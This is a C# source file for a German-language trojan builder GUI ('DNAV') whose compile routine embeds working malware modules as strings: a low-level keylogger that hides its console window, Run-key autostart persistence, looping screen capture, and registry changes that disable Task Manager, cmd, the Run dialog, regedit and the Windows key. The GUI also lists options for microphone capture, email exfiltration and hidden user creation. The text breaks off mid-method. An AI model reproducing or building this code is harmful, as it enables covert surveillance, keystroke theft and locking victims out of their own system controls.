using System;
using System.Windows;
using System.Windows.Forms;
using System.Windows.Controls;
using System.Windows.Input;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Text;
using System.IO;

namespace DNAV_GUI
{
    /// <summary>
    /// Interaktionslogik für MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        private string path = "dnav.exe";
        public MainWindow()
        {
            InitializeComponent();
        }

        private void Exit_Click(object sender, MouseButtonEventArgs e)
        {
            Environment.Exit(0);
        }

        private void Clients_Click(object sender, MouseButtonEventArgs e)
        {
            clientsGrid.Opacity = 1;
            clientsGrid.IsEnabled = true;
            clientsGrid.IsHitTestVisible = true;
            baukastenGrid.Opacity = 0;
            baukastenGrid.IsEnabled = false;
            baukastenGrid.IsHitTestVisible = false;
            removerGrid.Opacity = 0;
            removerGrid.IsEnabled = false;
            removerGrid.IsHitTestVisible = false;
            activeMainTab.SetValue(Grid.ColumnProperty, 0);
        }

        private void Baukasten_Click(object sender, MouseButtonEventArgs e)
        {
            clientsGrid.Opacity = 0;
            clientsGrid.IsEnabled = false;
            clientsGrid.IsHitTestVisible = false;
            baukastenGrid.Opacity = 1;
            baukastenGrid.IsEnabled = true;
            baukastenGrid.IsHitTestVisible = true;
            removerGrid.Opacity = 0;
            removerGrid.IsEnabled = false;
            removerGrid.IsHitTestVisible = false;
            activeMainTab.SetValue(Grid.ColumnProperty, 1);
        }

        private void Remover_Click(object sender, MouseButtonEventArgs e)
        {
            clientsGrid.Opacity = 0;
            clientsGrid.IsEnabled = false;
            clientsGrid.IsHitTestVisible = false;
            baukastenGrid.Opacity = 0;
            baukastenGrid.IsEnabled = false;
            baukastenGrid.IsHitTestVisible = false;
            removerGrid.Opacity = 1;
            removerGrid.IsEnabled = true;
            removerGrid.IsHitTestVisible = true;
            activeMainTab.SetValue(Grid.ColumnProperty, 2);
        }

        private void ChangePath_Click(object sender, MouseButtonEventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "Exe Datei|*.exe";
            if (sfd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                path = sfd.FileName;
                pathTextBlock.Text = path;
            }
        }

        private void Allgemein_Click(object sender, MouseButtonEventArgs e)
        {
            baukastenGrid1.Opacity = 1;
            baukastenGrid1.IsEnabled = true;
            baukastenGrid1.IsHitTestVisible = true;
            baukastenGrid2.Opacity = 0;
            baukastenGrid2.IsEnabled = false;
            baukastenGrid2.IsHitTestVisible = false;
            baukastenGrid3.Opacity = 0;
            baukastenGrid3.IsEnabled = false;
            baukastenGrid3.IsHitTestVisible = false;
            baukastenGrid4.Opacity = 0;
            baukastenGrid4.IsEnabled = false;
            baukastenGrid4.IsHitTestVisible = false;
            baukastenGrid5.Opacity = 0;
            baukastenGrid5.IsEnabled = false;
            baukastenGrid5.IsHitTestVisible = false;
            baukastenGrid6.Opacity = 0;
            baukastenGrid6.IsEnabled = false;
            baukastenGrid6.IsHitTestVisible = false;
            activeTab.SetValue(Grid.RowProperty, 1);
        }

        private void Heimlich_Click(object sender, MouseButtonEventArgs e)
        {
            baukastenGrid1.Opacity = 0;
            baukastenGrid1.IsEnabled = false;
            baukastenGrid1.IsHitTestVisible = false;
            baukastenGrid2.Opacity = 1;
            baukastenGrid2.IsEnabled = true;
            baukastenGrid2.IsHitTestVisible = true;
            baukastenGrid3.Opacity = 0;
            baukastenGrid3.IsEnabled = false;
            baukastenGrid3.IsHitTestVisible = false;
            baukastenGrid4.Opacity = 0;
            baukastenGrid4.IsEnabled = false;
            baukastenGrid4.IsHitTestVisible = false;
            baukastenGrid5.Opacity = 0;
            baukastenGrid5.IsEnabled = false;
            baukastenGrid5.IsHitTestVisible = false;
            baukastenGrid6.Opacity = 0;
            baukastenGrid6.IsEnabled = false;
            baukastenGrid6.IsHitTestVisible = false;
            activeTab.SetValue(Grid.RowProperty, 3);
        }

        private void Aggressiv_Click(object sender, MouseButtonEventArgs e)
        {
            baukastenGrid1.Opacity = 0;
            baukastenGrid1.IsEnabled = false;
            baukastenGrid1.IsHitTestVisible = false;
            baukastenGrid2.Opacity = 0;
            baukastenGrid2.IsEnabled = false;
            baukastenGrid2.IsHitTestVisible = false;
            baukastenGrid3.Opacity = 1;
            baukastenGrid3.IsEnabled = true;
            baukastenGrid3.IsHitTestVisible = true;
            baukastenGrid4.Opacity = 0;
            baukastenGrid4.IsEnabled = false;
            baukastenGrid4.IsHitTestVisible = false;
            baukastenGrid5.Opacity = 0;
            baukastenGrid5.IsEnabled = false;
            baukastenGrid5.IsHitTestVisible = false;
            baukastenGrid6.Opacity = 0;
            baukastenGrid6.IsEnabled = false;
            baukastenGrid6.IsHitTestVisible = false;
            activeTab.SetValue(Grid.RowProperty, 5);
        }

        private void Email_Click(object sender, MouseButtonEventArgs e)
        {
            baukastenGrid1.Opacity = 0;
            baukastenGrid1.IsEnabled = false;
            baukastenGrid1.IsHitTestVisible = false;
            baukastenGrid2.Opacity = 0;
            baukastenGrid2.IsEnabled = false;
            baukastenGrid2.IsHitTestVisible = false;
            baukastenGrid3.Opacity = 0;
            baukastenGrid3.IsEnabled = false;
            baukastenGrid3.IsHitTestVisible = false;
            baukastenGrid4.Opacity = 1;
            baukastenGrid4.IsEnabled = true;
            baukastenGrid4.IsHitTestVisible = true;
            baukastenGrid5.Opacity = 0;
            baukastenGrid5.IsEnabled = false;
            baukastenGrid5.IsHitTestVisible = false;
            baukastenGrid6.Opacity = 0;
            baukastenGrid6.IsEnabled = false;
            baukastenGrid6.IsHitTestVisible = false;
            activeTab.SetValue(Grid.RowProperty, 7);
        }

        private void TCP_Click(object sender, MouseButtonEventArgs e)
        {
            baukastenGrid1.Opacity = 0;
            baukastenGrid1.IsEnabled = false;
            baukastenGrid1.IsHitTestVisible = false;
            baukastenGrid2.Opacity = 0;
            baukastenGrid2.IsEnabled = false;
            baukastenGrid2.IsHitTestVisible = false;
            baukastenGrid3.Opacity = 0;
            baukastenGrid3.IsEnabled = false;
            baukastenGrid3.IsHitTestVisible = false;
            baukastenGrid4.Opacity = 0;
            baukastenGrid4.IsEnabled = false;
            baukastenGrid4.IsHitTestVisible = false;
            baukastenGrid5.Opacity = 1;
            baukastenGrid5.IsEnabled = true;
            baukastenGrid5.IsHitTestVisible = true;
            baukastenGrid6.Opacity = 0;
            baukastenGrid6.IsEnabled = false;
            baukastenGrid6.IsHitTestVisible = false;
            activeTab.SetValue(Grid.RowProperty, 9);
        }

        private void Erstellen_Click(object sender, MouseButtonEventArgs e)
        {
            baukastenGrid1.Opacity = 0;
            baukastenGrid1.IsEnabled = false;
            baukastenGrid1.IsHitTestVisible = false;
            baukastenGrid2.Opacity = 0;
            baukastenGrid2.IsEnabled = false;
            baukastenGrid2.IsHitTestVisible = false;
            baukastenGrid3.Opacity = 0;
            baukastenGrid3.IsEnabled = false;
            baukastenGrid3.IsHitTestVisible = false;
            baukastenGrid4.Opacity = 0;
            baukastenGrid4.IsEnabled = false;
            baukastenGrid4.IsHitTestVisible = false;
            baukastenGrid5.Opacity = 0;
            baukastenGrid5.IsEnabled = false;
            baukastenGrid5.IsHitTestVisible = false;
            baukastenGrid6.Opacity = 1;
            baukastenGrid6.IsEnabled = true;
            baukastenGrid6.IsHitTestVisible = true;
            activeTab.SetValue(Grid.RowProperty, 11);
        }

        private void Window_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ChangedButton == MouseButton.Left)
            {
                this.DragMove();
            }
        }

        private void keyloggerCheckbox_Checked(object sender, RoutedEventArgs e)
        {
            keyloggerLocalCheckbox.IsEnabled = true;
            keyloggerEmailCheckbox.IsEnabled = true;
        }

        private void keyloggerCheckbox_Unchecked(object sender, RoutedEventArgs e)
        {
            keyloggerLocalCheckbox.IsEnabled = false;
            keyloggerEmailCheckbox.IsEnabled = false;
        }

        private void keyloggerLocalCheckbox_Checked(object sender, RoutedEventArgs e)
        {
            keyloggerLocalCombobox.IsEnabled = true;
        }

        private void keyloggerLocalCheckbox_Unchecked(object sender, RoutedEventArgs e)
        {
            keyloggerLocalCombobox.IsEnabled = false;
        }

        private void autostartCheckbox_Checked(object sender, RoutedEventArgs e)
        {
            autostartCopyCheckbox.IsEnabled = true;
        }

        private void autostartCheckbox_Unchecked(object sender, RoutedEventArgs e)
        {
            autostartCopyCheckbox.IsEnabled = false;
        }

        private void autostartCopyCheckbox_Checked(object sender, RoutedEventArgs e)
        {
            autostartCopyCombobox.IsEnabled = true;
        }

        private void autostartCopyCheckbox_Unchecked(object sender, RoutedEventArgs e)
        {
            autostartCopyCombobox.IsEnabled = false;
        }

        private void microphoneCheckbox_Checked(object sender, RoutedEventArgs e)
        {
            microphoneLocalCheckbox.IsEnabled = true;
            microphoneEmailCheckbox.IsEnabled = true;
        }

        private void microphoneCheckbox_Unchecked(object sender, RoutedEventArgs e)
        {
            microphoneLocalCheckbox.IsEnabled = false;
            microphoneEmailCheckbox.IsEnabled = false;
        }

        private void microphoneLocalCheckbox_Checked(object sender, RoutedEventArgs e)
        {
            microphoneLocalCombobox.IsEnabled = true;
        }

        private void microphoneLocalCheckbox_Unchecked(object sender, RoutedEventArgs e)
        {
            microphoneLocalCombobox.IsEnabled = false;
        }

        private void screenshotCheckbox_Checked(object sender, RoutedEventArgs e)
        {
            screenshotLocalCheckbox.IsEnabled = true;
            screenshotEmailCheckbox.IsEnabled = true;
        }

        private void screenshotCheckbox_Unchecked(object sender, RoutedEventArgs e)
        {
            screenshotLocalCheckbox.IsEnabled = false;
            screenshotEmailCheckbox.IsEnabled = false;
        }

        private void screenshotLocalCheckbox_Checked(object sender, RoutedEventArgs e)
        {
            screenshotLocalCombobox.IsEnabled = true;
        }

        private void screenshotLocalCheckbox_Unchecked(object sender, RoutedEventArgs e)
        {
            screenshotLocalCombobox.IsEnabled = false;
        }

        private void createUserCheckbox_Checked(object sender, RoutedEventArgs e)
        {
            createUserUsernameTextbox.IsEnabled = true;
            createUserPasswortTextbox.IsEnabled = true;
        }

        private void createUserCheckbox_Unchecked(object sender, RoutedEventArgs e)
        {
            createUserUsernameTextbox.IsEnabled = false;
            createUserPasswortTextbox.IsEnabled = false;
        }

        private void Compile_Click(object sender, MouseButtonEventArgs e)
        {
            string keyloggerHideCode = @"class Keylogger
    {
        private static string _keys = """";

        // 13 = Tastatur LowLevel Input, 14 = Maus LowLevel
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static bool _logFile = false;
        private static string _path;
        const int SW_HIDE = 0;

        /// <summary>
        /// Enthält die gedrückten Tasten
        /// </summary>
        public static string Keys
        {
            get
            {
                return Keylogger._keys;
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (Keylogger._logFile)
                {
                    StreamWriter sw = new StreamWriter(Keylogger._path, true);
                    sw.WriteLine(""DOWN: "" + (Keys)vkCode);
                    sw.Close();
                }
                Keylogger._keys += ""DOWN: "" + (Keys)vkCode + ""\n"";
            } else if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (Keylogger._logFile)
                {
                    StreamWriter sw = new StreamWriter(Keylogger._path, true);
                    sw.WriteLine(""UP: "" + (Keys)vkCode);
                    sw.Close();
                }
                Keylogger._keys += ""UP: "" + (Keys)vkCode + ""\n"";
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport(""user32.dll"", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport(""user32.dll"", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport(""user32.dll"", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport(""kernel32.dll"", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport(""kernel32.dll"")]
        static extern IntPtr GetConsoleWindow();

        [DllImport(""user32.dll"")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        /// <summary>
        /// Aktiviert den Keylogger
        /// </summary>
        public static void Enable()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        /// <summary>
        /// Aktiviert den Keylogger und schreibt alle Tastenanschläge in eine Log Datei
        /// </summary>
        /// <param name=""path""></param>
        public static void EnableWithLog(string path)
        {
            Keylogger._logFile = true;
            Keylogger._path = path;
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        /// <summary>
        /// Versteckt das Konsolenfenster
        /// </summary>
        public static void Hide()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
        }

        /// <summary>
        /// Bestimmt Groß- und Kleinschreibung durch die rohe Ausgabe des Trojaners 
        /// </summary>
        /// <param name=""input""></param>
        /// <returns></returns>
        public static string CompileRawOutput(string input)
        {
            if(input == """")
            {
                return """";
            }

            string output = """";
            bool wasSpecial = false;
            bool isShift = false;
            bool isAlt = false;
            bool isCtrl = false;
            bool isWin = false;
            bool isAltGr = false;
            const string CTRL_KEY = ""LControlKey\r"";
            const string RCTRL_KEY = ""RControlKey\r"";
            const string SHFT_KEY = ""LShiftKey\r"";
            const string RSHFT_KEY = ""RShiftKey\r"";
            const string ALT_KEY = ""LMenu\r"";
            const string ALTGR_KEY = ""RMenu\r"";
            const string WIN_KEY = ""LWin\r"";
            const string RWIN_KEY = ""RWin\r"";
            const string CAPS_KEY = ""Capital\r"";

            string[] keys = input.Split('\n');

            foreach(string s in keys)
            {
                if(s != """")
                {
                    string[] temp = s.Split(' ');
                    if (temp[0] == ""DOWN:"")
                    {
                        switch (temp[1])
                        {
                            case CTRL_KEY:
                            case RCTRL_KEY:
                                isCtrl = true;
                                wasSpecial = true;
                                break;
                            case SHFT_KEY:
                            case RSHFT_KEY:
                                isShift = true;
                                wasSpecial = true;
                                break;
                            case ALT_KEY:
                                isAlt = true;
                                wasSpecial = true;
                                break;
                            case WIN_KEY:
                            case RWIN_KEY:
                                isWin = true;
                                wasSpecial = true;
                                break;
                            case ALTGR_KEY:
                                isAltGr = true;
                                wasSpecial = true;
                                break;
                        }
                    }
                    else
                    {
                        switch (temp[1])
                        {
                            case CTRL_KEY:
                            case RCTRL_KEY:
                                isCtrl = false;
                                break;
                            case SHFT_KEY:
                            case RSHFT_KEY:
                                isShift = false;
                                break;
                            case ALT_KEY:
                                isAlt = false;
                                break;
                            case WIN_KEY:
                            case RWIN_KEY:
                                isWin = false;
                                break;
                            case ALTGR_KEY:
                                isAltGr = false;
                                break;
                        }
                    }

                    if (temp[0] == ""DOWN:"" && !wasSpecial)
                    {
                        if (isCtrl)
                        {
                            output += ""Ctrl + "";
                        }
                        if (isAlt)
                        {
                            output += ""Alt + "";
                        }
                        if (isShift)
                        {
                            output += ""Shift + "";
                        }
                        if (isWin)
                        {
                            output += ""Win + "";
                        }
                        if (isAltGr)
                        {
                            output += ""Alt Gr + "";
                        }
                        if (temp[1] != CTRL_KEY && temp[1] != RCTRL_KEY && temp[1] != SHFT_KEY && temp[1] != RSHFT_KEY && temp[1] != ALT_KEY && temp[1] != ALTGR_KEY && temp[1] != WIN_KEY && temp[1] != RWIN_KEY)
                        {
                            output += temp[1].ToLower();
                        }
                    }
                    wasSpecial = false;
                }
            }
            return output;
        }

    }";
            string autostartCode = @"class Startup
    {
        /// <summary>
        /// Startet den Trojaner beim Start von Windows.
        /// </summary>
        public static void Enable()
        {
            string src = Application.ExecutablePath;
            string file = Path.GetFileName(src);
            string dst = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @""\Tofu\"";

            Directory.CreateDirectory(dst);
            File.Copy(src, dst + file);
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"", true);
            key.SetValue(""DNAV"", Application.ExecutablePath.ToString());
            key.Close();
        }

        /// <summary>
        /// Kopiert den Trojaner an einen anderen Ort und startet diesen beim Start von Windows.
        /// </summary>
        /// <param name=""destinationPath"">Ordner, in den der Trojaner kopiert werden soll.</param>
        /// <param name=""executableName"">Name des Trojaner Anwendung. Muss mit .exe enden</param>
        public static void CopyAndEnable(string destinationPath, string executableName)
        {
            Directory.CreateDirectory(destinationPath);
            File.Copy(Application.ExecutablePath, destinationPath + @""\"" + executableName);
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"", true);
            key.SetValue(""DNAV"", destinationPath + @""\"" + executableName);
            key.Close();
        }

        /// <summary>
        /// Deaktiviert den Autostart des Trojaners.
        /// </summary>
        public static void Disable()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"", true);
            key.DeleteValue(""DNAV"", false);
        }

        /// <summary>
        /// Startet den Trojaner beim Start von Windows. Wird benötigt, wenn der Trojaner nur mit Administratorrechten ausgeführt werden kann.
        /// </summary>
        public static void EnableForAdmin()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"", true);
            key.SetValue(""DNAV"", Application.ExecutablePath.ToString());
            key.Close();
        }

        /// <summary>
        ///  Kopiert den Trojaner an einen anderen Ort und startet diesen beim Start von Windows. Wird benötigt, wenn der Trojaner nur mit Administratorrechten ausgeführt werden kann.
        /// </summary>
        /// <param name=""destinationPath"">Ordner, in den der Trojaner kopiert werden soll.</param>
        /// <param name=""executableName"">Name des Trojaner Anwendung. Muss mit .exe enden</param>
        public static void CopyAndEnableForAdmin(string destinationPath, string executableName)
        {
            Directory.CreateDirectory(destinationPath);
            File.Copy(Application.ExecutablePath, destinationPath + @""\"" + executableName);
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"", true);
            key.SetValue(""DNAV"", destinationPath + @""\"" + executableName);
            key.Close();
        }

        /// <summary>
        /// Deaktiviert den Autostart des Trojaners mit Administratorrechten.
        /// </summary>
        public static void DisableForAdmin()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"", true);
            key.DeleteValue(""DNAV"", false);
        }
    }";
            string screenshotCode = @"class ScreenCapture
    {
        // Nicht selbst geschrieben(!)
        // ourcodeworld.com/articles/read/195/capturing-screenshots-of-different-ways-with-c-and-winforms
        public Image CaptureScreen()
        {
            return CaptureWindow(User32.GetDesktopWindow());
        }
        /// <summary>
        /// Creates an Image object containing a screen shot of a specific window
        /// </summary>
        /// <param name=""handle"">The handle to the window. (In windows forms, this is obtained by the Handle property)</param>
        /// <returns></returns>
        public Image CaptureWindow(IntPtr handle)
        {
            // get te hDC of the target window
            IntPtr hdcSrc = User32.GetWindowDC(handle);
            // get the size
            User32.RECT windowRect = new User32.RECT();
            User32.GetWindowRect(handle, ref windowRect);
            int width = windowRect.right - windowRect.left;
            int height = windowRect.bottom - windowRect.top;
            // create a device context we can copy to
            IntPtr hdcDest = GDI32.CreateCompatibleDC(hdcSrc);
            // create a bitmap we can copy it to,
            // using GetDeviceCaps to get the width/height
            IntPtr hBitmap = GDI32.CreateCompatibleBitmap(hdcSrc, width, height);
            // select the bitmap object
            IntPtr hOld = GDI32.SelectObject(hdcDest, hBitmap);
            // bitblt over
            GDI32.BitBlt(hdcDest, 0, 0, width, height, hdcSrc, 0, 0, GDI32.SRCCOPY);
            // restore selection
            GDI32.SelectObject(hdcDest, hOld);
            // clean up 
            GDI32.DeleteDC(hdcDest);
            User32.ReleaseDC(handle, hdcSrc);
            // get a .NET image object for it
            Image img = Image.FromHbitmap(hBitmap);
            // free up the Bitmap object
            GDI32.DeleteObject(hBitmap);
            return img;
        }
        /// <summary>
        /// Captures a screen shot of a specific window, and saves it to a file
        /// </summary>
        /// <param name=""handle"">Handle des Zielfensters</param>
        /// <param name=""filename"">Dateiname</param>
        /// <param name=""format"">Dateiformat des Bildes</param>
        public void CaptureWindowToFile(IntPtr handle, string filename, ImageFormat format)
        {
            Image img = CaptureWindow(handle);
            img.Save(filename, format);
        }

        /// <summary>
        /// Captures a screen shot of a specific window, and saves it to a file
        /// </summary>
        /// <param name=""handle"">Handle des Zielfensters</param>
        /// <param name=""filename"">Dateiname</param>
        /// <param name=""format"">Dateiformat des Bildes</param>
        /// <param name=""interval"">Interval in Sekunden</param>
        public void CaptureWindowToFile(IntPtr handle, string filename, ImageFormat format, int interval)
        {
            while (true)
            {
                Image img = CaptureWindow(handle);
                img.Save(filename, format);
                Thread.Sleep(interval * 1000);
            }
        }

        /// <summary>
        /// Captures a screen shot of the entire desktop, and saves it to a file
        /// </summary>
        /// <param name=""filename"">Dateiname</param>
        /// <param name=""format"">Interval in Sekunden</param>
        public void CaptureScreenToFile(string filename, ImageFormat format)
        {
            Image img = CaptureScreen();
            img.Save(filename, format);
        }

        /// <summary>
        /// Captures a screen shot of the entire desktop, and saves it to a file
        /// </summary>
        /// <param name=""filename"">Dateiname</param>
        /// <param name=""format"">Dateiformat des Bildes</param>
        /// <param name=""interval"">Interval in Sekunden</param>
        public void CaptureScreenToFile(string filename, ImageFormat format, int interval)
        {
            while (true)
            {
                Image img = CaptureScreen();
                img.Save(filename, format);
                Thread.Sleep(interval * 1000);
            }
        }

        /// <summary>
        /// Helper class containing Gdi32 API functions
        /// </summary>
        private class GDI32
        {
            public const int SRCCOPY = 0x00CC0020; // BitBlt dwRop parameter
            [DllImport(""gdi32.dll"")]
            public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest,
                int nWidth, int nHeight, IntPtr hObjectSource,
                int nXSrc, int nYSrc, int dwRop);
            [DllImport(""gdi32.dll"")]
            public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nWidth,
                int nHeight);
            [DllImport(""gdi32.dll"")]
            public static extern IntPtr CreateCompatibleDC(IntPtr hDC);
            [DllImport(""gdi32.dll"")]
            public static extern bool DeleteDC(IntPtr hDC);
            [DllImport(""gdi32.dll"")]
            public static extern bool DeleteObject(IntPtr hObject);
            [DllImport(""gdi32.dll"")]
            public static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObject);
        }

        /// <summary>
        /// Helper class containing User32 API functions
        /// </summary>
        private class User32
        {
            [StructLayout(LayoutKind.Sequential)]
            public struct RECT
            {
                public int left;
                public int top;
                public int right;
                public int bottom;
            }
            [DllImport(""user32.dll"")]
            public static extern IntPtr GetDesktopWindow();
            [DllImport(""user32.dll"")]
            public static extern IntPtr GetWindowDC(IntPtr hWnd);
            [DllImport(""user32.dll"")]
            public static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);
            [DllImport(""user32.dll"")]
            public static extern IntPtr GetWindowRect(IntPtr hWnd, ref RECT rect);
        }
    }";
            string cmdCode = @"class Cmd
    {
        /// <summary>
        /// Aktiviert die Konsole
        /// </summary>
        public static void Enable()
        {
            RegistryKey cmd = Registry.CurrentUser.CreateSubKey(@""Software\Policies\Microsoft\Windows\System"");
            if (cmd.GetValue(""DisableCMD"") != null)
            {
                cmd.DeleteValue(""DisableCMD"");
            }
        }
        /// <summary>
        /// Deaktiviert die Konsole
        /// </summary>
        public static void Disable()
        {
            RegistryKey cmd = Registry.CurrentUser.CreateSubKey(@""Software\Policies\Microsoft\Windows\System"");
            cmd.SetValue(""DisableCMD"", 0x00000001, RegistryValueKind.DWord);
            cmd.Close();
        }
    }";
            string runCode = @"class Run
    {
        /// <summary>
        /// Aktiviert den Ausführen Dialog
        /// </summary>
        public static void Enable()
        {
            RegistryKey run = Registry.CurrentUser.CreateSubKey(@""Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"");
            if (run.GetValue(""NoRun"") != null)
            {
                run.DeleteValue(""NoRun"");
            }
        }

        /// <summary>
        /// Deaktiviert den Ausführen Dialog
        /// </summary>
        public static void Disable()
        {
            RegistryKey run = Registry.CurrentUser.CreateSubKey(@""Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"");
            run.SetValue(""NoRun"", 0x00000001, RegistryValueKind.DWord);
            run.Close();/**/
        }
    }";
            string taskmanagerCode = @"class Taskmanager
    {
        /// <summary>
        /// Aktiviert den Taskmanager
        /// </summary>
        public static void Enable()
        {
            RegistryKey taskManagerKey = Registry.CurrentUser.CreateSubKey(@""Software\Microsoft\Windows\CurrentVersion\Policies\System"");
            if(taskManagerKey.GetValue(""DisableTaskMgr"") != null)
            {
                taskManagerKey.DeleteValue(""DisableTaskMgr"");
            }
        }

        /// <summary>
        /// Deaktiviert den Taskmanager
        /// </summary>
        public static void Disable()
        {
            RegistryKey taskManagerKey = Registry.CurrentUser.CreateSubKey(@""Software\Microsoft\Windows\CurrentVersion\Policies\System"");
            taskManagerKey.SetValue(""DisableTaskMgr"", ""1"");
            taskManagerKey.Close();
        }
    }";
            string windowskeyCode = @"class WindowsKey
    {
        /// <summary>
        /// Deaktiviert die Windows Taste.
        /// </summary>
        public static void Disable()
        {
            RegistryKey key;

            key = Registry.LocalMachine.OpenSubKey(@""System\CurrentControlSet\Control\Keyboard Layout"", true);
            byte[] binary = new byte[] {
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x03,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x5B,
                    0xE0,
                    0x00,
                    0x00,
                    0x5C,
                    0xE0,
                    0x00,
                    0x00,
                    0x00,
                    0x00
                };
            key.SetValue(""Scancode Map"", binary, RegistryValueKind.Binary);

            key.Close();

        }

         /// <summary>
         /// Aktiviert die Windowstaste.
         /// </summary>
        public static void Enable()
        {
            RegistryKey key;

            key = Registry.LocalMachine.OpenSubKey(@""System\CurrentControlSet\Control\Keyboard Layout"", true);
            key.DeleteValue(""Scancode Map"", true);

            key.Close();

        }
    }";
            string powershellCode = @"class Powershell
    {
        // Funktioniert aktuell nicht, da zu tief in Windows verankert und erfordert höhere Rechte als Admin
        public static void Disable()
        {
            Process.Start(""CMD.exe"", ""dism /online /disable-feature /featurename:MicrosoftWindowsPowerShellV2"");
            if (File.Exists(@""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""))
            {
                File.Move(@""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"", @""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe.bak"");
            }
            RegistryKey key = Registry.ClassesRoot.OpenSubKey(@""Directory\shell\Powershell"");
            key.DeleteSubKey(""command"");
        }

        public static void DisableRoot()
        {
            Process.Start(""CMD.exe"", ""dism /online /disable-feature /featurename:MicrosoftWindowsPowerShellV2Root"");
            if (File.Exists(@""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""))
            {
                File.Move(@""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"", @""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe.bak"");
            }
            RegistryKey key = Registry.ClassesRoot.OpenSubKey(@""Directory\shell\Powershell"");
            key.DeleteSubKey(""command"");
        }

        public static void Enable()
        {
            Process.Start(""CMD.exe"", ""dism /online /enable-feature /featurename:MicrosoftWindowsPowerShellV2"");
            if (File.Exists(@""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe.bak""))
            {
                File.Move(@""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe.bak"", @""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"");
            }
            RegistryKey key = Registry.ClassesRoot.OpenSubKey(@""Directory\shell\Powershell"");
            RegistryKey command = key.CreateSubKey(""command"");
            command.SetValue("""", ""powershell.exe -noexit -command Set-Location -literalPath '%V'"");
        }

        public static void EnableRoot()
        {
            Process.Start(""CMD.exe"", ""dism /online /enable-feature /featurename:MicrosoftWindowsPowerShellV2Root"");
            if (File.Exists(@""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe.bak""))
            {
                File.Move(@""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe.bak"", @""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"");
            }
            RegistryKey key = Registry.ClassesRoot.OpenSubKey(@""Directory\shell\Powershell"");
            RegistryKey command = key.CreateSubKey(""command"");
            command.SetValue("""", ""powershell.exe -noexit -command Set-Location -literalPath '%V'"");
        }
    }";
            string regeditCode = @"class RegEdit
    {
        /// <summary>
        /// Aktiviert den Registrierungseditor
        /// </summary>
        public static void Enable()
        {
            RegistryKey taskManagerKey = Registry.CurrentUser.CreateSubKey(@""Software\Microsoft\Windows\CurrentVersion\Policies\System"");
            if (taskManagerKey.GetValue(""DisableRegistryTools"") != null)
            {
                taskManagerKey.DeleteValue(""DisableRegistryTools"");
            }
        }

        /// <summary>
        /// Deaktiviert den Registrierungseditor. Gilt nur für nicht-Admin Benutzer
        /// </summary>
        public static void Disable()
        {
